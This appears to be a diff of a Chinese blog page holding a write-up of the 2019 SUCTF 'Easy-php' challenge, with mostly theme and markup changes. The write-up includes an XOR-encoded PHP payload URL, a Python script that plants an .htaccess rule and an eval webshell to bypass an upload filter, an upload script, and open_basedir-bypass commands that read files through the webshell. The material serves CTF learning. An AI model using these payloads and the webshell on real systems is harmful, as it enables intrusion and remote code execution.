+<pre><code class="hljs perl">http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span>:<span class="hljs-number">8877</span>/?<span class="hljs-number">_</span>=$&#123;%80%80%80%80^%df%c7%c5%d4&#125;&#123;%df&#125;();&amp;%df=phpinfo</code></pre>
 
 <p>这里由于eval函数只能解析一便代码，不能传入</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:8877&#x2F;?_&#x3D;$&#123;%80%80%80%80^%df%c7%c5%d4&#125;&#123;%df&#125;&amp;%df&#x3D;phpinfo();</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs llvm">http://<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">8877</span>/?_=$&#123;<span class="hljs-symbol">%80</span><span class="hljs-symbol">%80</span><span class="hljs-symbol">%80</span><span class="hljs-symbol">%80</span>^<span class="hljs-symbol">%df</span><span class="hljs-symbol">%c7</span><span class="hljs-symbol">%c5</span><span class="hljs-symbol">%d4</span>&#125;&#123;<span class="hljs-symbol">%df</span>&#125;&amp;<span class="hljs-symbol">%df</span>=phpinfo()<span class="hljs-comment">;</span></code></pre>
 
-<h2 id="上传htaccess"><a href="#上传htaccess" class="headerlink" title="上传htaccess"></a>上传htaccess</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="comment"># Description : create and bypass file upload filter with .htaccess</span></span><br><span class="line"><span class="comment"># Author : Thibaud Robin</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Will prove the file is a legit xbitmap file and the size is 1337x1337</span></span><br><span class="line"><span class="comment">#SIZE_HEADER = b"\n\n#define width 1337\n#define height 1337\n\n"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_php_file</span><span class="params">(filename, script)</span>:</span></span><br><span class="line">    phpfile = open(filename, <span class="string">'wb'</span>) </span><br><span class="line">    phpfile.write(SIZE_HEADER)</span><br><span class="line">    phpfile.write(script.encode(<span class="string">'utf-16be'</span>))</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    phpfile.close()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_htacess</span><span class="params">()</span>:</span></span><br><span class="line">    htaccess = open(<span class="string">'.htaccess'</span>, <span class="string">'wb'</span>)</span><br><span class="line">    htaccess.write(SIZE_HEADER)</span><br><span class="line">    htaccess.write(<span class="string">b'AddType application/x-httpd-php .ppp\n'</span>)</span><br><span class="line">    htaccess.write(<span class="string">b'php_value zend.multibyte 1\n'</span>)</span><br><span class="line">    htaccess.write(<span class="string">b'php_value zend.detect_unicode 1\n'</span>)</span><br><span class="line">    htaccess.write(<span class="string">b'php_value display_errors 1\n'</span>)</span><br><span class="line"></span><br><span class="line">    htaccess.close()</span><br><span class="line">        </span><br><span class="line">generate_htacess()</span><br><span class="line"></span><br><span class="line">generate_php_file(<span class="string">"webshell.ppp"</span>, <span class="string">"&lt;?php eval($_GET['cmd']); die(); ?&gt;"</span>)</span><br></pre></td></tr></table></figure>
+<h2 id="上传htaccess"><a href="#上传htaccess" class="headerlink" title="上传htaccess"></a>上传htaccess</h2><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span>
+<span class="hljs-comment"># Description : create and bypass file upload filter with .htaccess</span>
+<span class="hljs-comment"># Author : Thibaud Robin</span>
+
+<span class="hljs-comment"># Will prove the file is a legit xbitmap file and the size is 1337x1337</span>
+<span class="hljs-comment">#SIZE_HEADER = b"\n\n#define width 1337\n#define height 1337\n\n"</span>
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">generate_php_file</span><span class="hljs-params">(filename, script)</span>:</span>
+    phpfile = open(filename, <span class="hljs-string">'wb'</span>) 
+    phpfile.write(SIZE_HEADER)
+    phpfile.write(script.encode(<span class="hljs-string">'utf-16be'</span>))
+    
+
+    phpfile.close()
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">generate_htacess</span><span class="hljs-params">()</span>:</span>
+    htaccess = open(<span class="hljs-string">'.htaccess'</span>, <span class="hljs-string">'wb'</span>)
+    htaccess.write(SIZE_HEADER)
+    htaccess.write(<span class="hljs-string">b'AddType application/x-httpd-php .ppp\n'</span>)
+    htaccess.write(<span class="hljs-string">b'php_value zend.multibyte 1\n'</span>)
+    htaccess.write(<span class="hljs-string">b'php_value zend.detect_unicode 1\n'</span>)
+    htaccess.write(<span class="hljs-string">b'php_value display_errors 1\n'</span>)
+
+    htaccess.close()
+        
+generate_htacess()
+
+generate_php_file(<span class="hljs-string">"webshell.ppp"</span>, <span class="hljs-string">"&lt;?php eval($_GET['cmd']); die(); ?&gt;"</span>)</code></pre>
 
 
 
 <p>上传<code>.htaccess</code>后上传webshell.ppp</p>
 <p>EXP<br>直接使用requests扩展上传</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">"http://127.0.0.1:8877/?_=$&#123;%80%80%80%80^%df%c7%c5%d4&#125;&#123;%df&#125;();&amp;%df=get_the_flag"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#file=open("/home/osword/Desktop/.htaccess","rb")</span></span><br><span class="line">file=open(<span class="string">"/home/osword/Desktop/webshell.ppp"</span>,<span class="string">"rb"</span>)</span><br><span class="line">files=&#123;<span class="string">'file'</span>:file&#125;</span><br><span class="line">response=requests.post(url,files=files)</span><br><span class="line">file.close()</span><br><span class="line"><span class="keyword">print</span> response.status_code</span><br><span class="line"><span class="keyword">print</span> response.request.body</span><br><span class="line"><span class="keyword">print</span> <span class="string">'--------------------------------'</span></span><br><span class="line"><span class="keyword">print</span> response.text</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs python"><span class="hljs-keyword">import</span> requests
 
-<p><img src="./1566634092815.png" alt=""></p>
+url=<span class="hljs-string">"http://127.0.0.1:8877/?_=$&#123;%80%80%80%80^%df%c7%c5%d4&#125;&#123;%df&#125;();&amp;%df=get_the_flag"</span>
+
+<span class="hljs-comment">#file=open("/home/osword/Desktop/.htaccess","rb")</span>
+file=open(<span class="hljs-string">"/home/osword/Desktop/webshell.ppp"</span>,<span class="hljs-string">"rb"</span>)
+files=&#123;<span class="hljs-string">'file'</span>:file&#125;
+response=requests.post(url,files=files)
+file.close()
+<span class="hljs-keyword">print</span> response.status_code
+<span class="hljs-keyword">print</span> response.request.body
+<span class="hljs-keyword">print</span> <span class="hljs-string">'--------------------------------'</span>
+<span class="hljs-keyword">print</span> response.text</code></pre>
+
+<p><img src="./1566634092815.png" srcset="/img/loading.gif" alt=""></p>
 <h2 id="disbale-functions过滤不全"><a href="#disbale-functions过滤不全" class="headerlink" title="disbale_functions过滤不全"></a>disbale_functions过滤不全</h2><p><a href="http://127.0.0.1:8877/upload/tmp_2ff4fb82e497844a03adf28cf6bedfde/webshell.ppp?cmd=ini_set(%27open_basedir%27,%27..%27);chdir(%27..%27);chdir(%27..%27);chdir(%27..%27);chdir(%27..%27);ini_set(%27open_basedir%27,%27/%27);var_dump(scandir(%27/%27)" target="_blank" rel="noopener">http://127.0.0.1:8877/upload/tmp_2ff4fb82e497844a03adf28cf6bedfde/webshell.ppp?cmd=ini_set(%27open_basedir%27,%27..%27);chdir(%27..%27);chdir(%27..%27);chdir(%27..%27);chdir(%27..%27);ini_set(%27open_basedir%27,%27/%27);var_dump(scandir(%27/%27)</a>);</p>
-<p><img src="./1566635928733.png" alt=""></p>
+<p><img src="./1566635928733.png" srcset="/img/loading.gif" alt=""></p>
 <p><a href="http://127.0.0.1:8877/upload/tmp_2ff4fb82e497844a03adf28cf6bedfde/webshell.ppp?cmd=ini_set(%27open_basedir%27,%27..%27);chdir(%27..%27);chdir(%27..%27);chdir(%27..%27);chdir(%27..%27);ini_set(%27open_basedir%27,%27/%27);readfile(%27/THis_Is_tHe_F14g%27)" target="_blank" rel="noopener">http://127.0.0.1:8877/upload/tmp_2ff4fb82e497844a03adf28cf6bedfde/webshell.ppp?cmd=ini_set(%27open_basedir%27,%27..%27);chdir(%27..%27);chdir(%27..%27);chdir(%27..%27);chdir(%27..%27);ini_set(%27open_basedir%27,%27/%27);readfile(%27/THis_Is_tHe_F14g%27)</a>;</p>
-<p><img src="./1566635895793.png" alt=""></p>
+<p><img src="./1566635895793.png" srcset="/img/loading.gif" alt=""></p>
 <h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://www.smi1e.top/php%E4%B8%8D%E4%BD%BF%E7%94%A8%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8D%E5%92%8C%E4%B8%8B%E5%88%92%E7%BA%BF%E5%86%99shell/" target="_blank" rel="noopener">https://www.smi1e.top/php%E4%B8%8D%E4%BD%BF%E7%94%A8%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8D%E5%92%8C%E4%B8%8B%E5%88%92%E7%BA%BF%E5%86%99shell/</a></p>
 <p><a href="https://blog.zeddyu.info/2019/07/20/isitdtu-2019/" target="_blank" rel="noopener">https://blog.zeddyu.info/2019/07/20/isitdtu-2019/</a></p>
 <p><a href="https://www.cnblogs.com/wfzWebSecuity/p/11373037.html" target="_blank" rel="noopener">https://www.cnblogs.com/wfzWebSecuity/p/11373037.html</a></p>
 
-  </div>
-</article>
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/CTF/">CTF</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" target="_blank" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext row">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2019/08/25/zzzphp1-7-0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">zzzphp1.7.0远程代码执行</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2019/07/30/Thinkphp5-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-%E4%BA%8C/">
+                        <span class="hidden-mobile">Thinkphp5 远程代码执行(二)</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
 
-    <section id="comments" class="comments">
-      <style>
-        .comments{margin:30px;padding:10px;background:#fff}
-        @media screen and (max-width:800px){.comments{margin:auto;padding:10px;background:#fff}}
-      </style>
-      <div class="valine_comment"></div>
-<!--载入js，在</body>之前插入即可-->
-<!--Leancloud 操作库:-->
-<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
-<!--Valine 的核心代码库-->
-<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
-<script>
-  new Valine({
-      el: '.valine_comment',
-      app_id: 'iQQPWYCs248kHd506mp50DKg-gzGzoHsz',
-      app_key: 'oUxg0tEGmlJSq2r3FuvEXgr4',
-      placeholder: '这里留言。。',
-      notify: 'true',
-      verify: 'true',
-      visitor: true
-    });
-</script>
-
-    </section>
-
-
-        
-          <div id="footer-post-container">
-  <div id="footer-post">
-
-    <div id="nav-footer" style="display: none">
-      <ul>
-         
-          <li><a href="/">首页</a></li>
-         
-          <li><a href="/about/">关于</a></li>
-         
-          <li><a href="/archives/">归档</a></li>
-         
-          <li><a href="/projects_url">项目</a></li>
-        
-      </ul>
+            
+          </article>
+        </div>
+      </div>
     </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div id="tocbot"></div>
+</div>
 
-    <div id="toc-footer" style="display: none">
-      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#easy-php"><span class="toc-number">1.</span> <span class="toc-text">easy-php</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#可见字符"><span class="toc-number">1.1.</span> <span class="toc-text">可见字符</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#上传htaccess"><span class="toc-number">1.2.</span> <span class="toc-text">上传htaccess</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#disbale-functions过滤不全"><span class="toc-number">1.3.</span> <span class="toc-text">disbale_functions过滤不全</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#参考链接"><span class="toc-number">2.</span> <span class="toc-text">参考链接</span></a></li></ol>
-    </div>
-
-    <div id="share-footer" style="display: none">
-      <ul>
-  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://zhzhdoai.github.io/2019/08/24/2019SUCTF-Easay-php%E9%A2%98%E8%A7%A3%E8%AE%B0%E5%BD%95/" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://twitter.com/share?url=http://zhzhdoai.github.io/2019/08/24/2019SUCTF-Easay-php%E9%A2%98%E8%A7%A3%E8%AE%B0%E5%BD%95/&text=2019SUCTF Easay-php题解记录" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://zhzhdoai.github.io/2019/08/24/2019SUCTF-Easay-php%E9%A2%98%E8%A7%A3%E8%AE%B0%E5%BD%95/&title=2019SUCTF Easay-php题解记录" target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://zhzhdoai.github.io/2019/08/24/2019SUCTF-Easay-php%E9%A2%98%E8%A7%A3%E8%AE%B0%E5%BD%95/&is_video=false&description=2019SUCTF Easay-php题解记录" target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=2019SUCTF Easay-php题解记录&body=Check out this article: http://zhzhdoai.github.io/2019/08/24/2019SUCTF-Easay-php%E9%A2%98%E8%A7%A3%E8%AE%B0%E5%BD%95/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://getpocket.com/save?url=http://zhzhdoai.github.io/2019/08/24/2019SUCTF-Easay-php%E9%A2%98%E8%A7%A3%E8%AE%B0%E5%BD%95/&title=2019SUCTF Easay-php题解记录" target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://reddit.com/submit?url=http://zhzhdoai.github.io/2019/08/24/2019SUCTF-Easay-php%E9%A2%98%E8%A7%A3%E8%AE%B0%E5%BD%95/&title=2019SUCTF Easay-php题解记录" target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://zhzhdoai.github.io/2019/08/24/2019SUCTF-Easay-php%E9%A2%98%E8%A7%A3%E8%AE%B0%E5%BD%95/&title=2019SUCTF Easay-php题解记录" target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://digg.com/submit?url=http://zhzhdoai.github.io/2019/08/24/2019SUCTF-Easay-php%E9%A2%98%E8%A7%A3%E8%AE%B0%E5%BD%95/&title=2019SUCTF Easay-php题解记录" target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://zhzhdoai.github.io/2019/08/24/2019SUCTF-Easay-php%E9%A2%98%E8%A7%A3%E8%AE%B0%E5%BD%95/&name=2019SUCTF Easay-php题解记录&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://zhzhdoai.github.io/2019/08/24/2019SUCTF-Easay-php%E9%A2%98%E8%A7%A3%E8%AE%B0%E5%BD%95/&t=2019SUCTF Easay-php题解记录" target="_blank" rel="noopener"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
-</ul>
-
-    </div>
-
-    <div id="actions-footer">
-        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
-        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
-        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
-        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
-    </div>
-
+      </div>
+    
   </div>
 </div>
 
-        
-        <footer id="footer">
-  <div class="footer-left">
-    Copyright &copy;
+<!-- Custom -->
+
+
     
-    
-    2016-2020
-    osword
+  </main>
+
+  
+    <a id="scroll-top-button" href="#" role="button">
+      <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+    </a>
+  
+
+  
+    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
   </div>
-  <div class="footer-right">
-    <nav>
-      <ul>
-         
-          <li><a href="/">首页</a></li>
-         
-          <li><a href="/about/">关于</a></li>
-         
-          <li><a href="/archives/">归档</a></li>
-         
-          <li><a href="/projects_url">项目</a></li>
-        
-      </ul>
-    </nav>
+</div>
+  
+
+  
+
+  
+
+  <footer class="mt-5">
+  <div class="text-center py-3">
+    <div>
+      <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a>
+      <i class="iconfont icon-love"></i>
+      <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener">
+        <span>Fluid</span></a>
+    </div>
+    
+
+    
+
+    
   </div>
 </footer>
 
-    </div>
-    <!-- styles -->
+<!-- SCRIPTS -->
+<script  src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js" ></script>
+<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/main.js" ></script>
 
-<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+<!-- Plugins -->
 
-
-<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
-
-
-    <!-- jquery -->
-
-<script src="/lib/jquery/jquery.min.js"></script>
-
-
-<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
-
-<!-- clipboard -->
 
   
-<script src="/lib/clipboard/clipboard.min.js"></script>
+    <script  src="/js/lazyload.js" ></script>
+  
 
-  <script type="text/javascript">
-  $(function() {
-    // copy-btn HTML
-    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
-    btn += '<i class="far fa-clone"></i>';
-    btn += '</span>'; 
-    // mount it!
-    $(".highlight table").before(btn);
-    var clip = new ClipboardJS('.btn-copy', {
-      text: function(trigger) {
-        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+
+
+  
+
+
+
+  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js" ></script>
+  <script  src="/js/clipboard-use.js" ></script>
+
+
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+  <script  src="https://cdn.staticfile.org/tocbot/4.11.1/tocbot.min.js" ></script>
+  <script>
+    $(document).ready(function () {
+      var boardCtn = $('#board-ctn');
+      var boardTop = boardCtn.offset().top;
+
+      tocbot.init({
+        tocSelector: '#tocbot',
+        contentSelector: '#post-body',
+        headingSelector: 'h1,h2,h3,h4,h5,h6',
+        linkClass: 'tocbot-link',
+        activeLinkClass: 'tocbot-active-link',
+        listClass: 'tocbot-list',
+        isCollapsedClass: 'tocbot-is-collapsed',
+        collapsibleClass: 'tocbot-is-collapsible',
+        collapseDepth: 0,
+        scrollSmooth: true,
+        headingsOffset: -boardTop
+      });
+      if ($('.toc-list-item').length > 0) {
+        $('#toc').css('visibility', 'visible');
       }
     });
-    clip.on('success', function(e) {
-      e.trigger.setAttribute('aria-label', "复制成功!");
-      e.clearSelection();
-    })
-  })
   </script>
 
 
-<script src="/js/main.js"></script>
 
-<!-- search -->
+  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
+  <script>
+    var typed = new Typed('#subtitle', {
+      strings: [
+        '  ',
+        "2019SUCTF Easay-php题解记录&nbsp;",
+      ],
+      cursorChar: "_",
+      typeSpeed: 70,
+      loop: false,
+    });
+    typed.stop();
+    $(document).ready(function () {
+      $(".typed-cursor").addClass("h2");
+      typed.start();
+    });
+  </script>
 
-<!-- Google Analytics -->
 
-<!-- Baidu Analytics -->
 
-<!-- Disqus Comments -->
+  <script  src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js" ></script>
+  <script>
+    anchors.options = {
+      placement: "right",
+      visible: "hover",
+      
+    };
+    var el = "h1,h2,h3,h4,h5,h6".split(",");
+    var res = [];
+    for (item of el) {
+      res.push(".markdown-body > " + item)
+    }
+    anchors.add(res.join(", "))
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    var path = "/local-search.xml";
+    var inputArea = document.querySelector("#local-search-input");
+    inputArea.onclick = function () {
+      searchFunc(path, 'local-search-input', 'local-search-result');
+      this.onclick = null
+    }
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+  <script>
+    $('#post img:not(.no-zoom img, img[no-zoom]), img[zoom]').each(
+      function () {
+        var element = document.createElement('a');
+        $(element).attr('data-fancybox', 'images');
+        $(element).attr('href', $(this).attr('src'));
+        $(this).wrap(element);
+      }
+    );
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 </body>
